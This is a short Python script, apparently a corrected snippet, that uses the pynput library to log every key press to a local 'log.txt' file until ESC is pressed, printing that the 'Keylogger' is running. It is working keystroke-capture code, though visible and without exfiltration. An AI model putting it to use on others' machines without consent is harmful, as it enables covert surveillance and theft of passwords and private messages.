from pynput.keyboard import Key, Listener

def on_press(key):
    # Check if the pressed key is the ESC key
    if key == Key.esc:
        # Stop the listener if ESC is pressed
        return False

    # This block will now run correctly for every other key
    try:
        with open('log.txt', 'a') as f:
            f.write(str(key) + '\n')
    except Exception as e:
        print(f"An error occurred: {e}")

# The listener setup is the same
with Listener(on_press=on_press) as listener:
    print("Keylogger is running... Press ESC to stop.")
    listener.join()

print("Keylogger stopped.")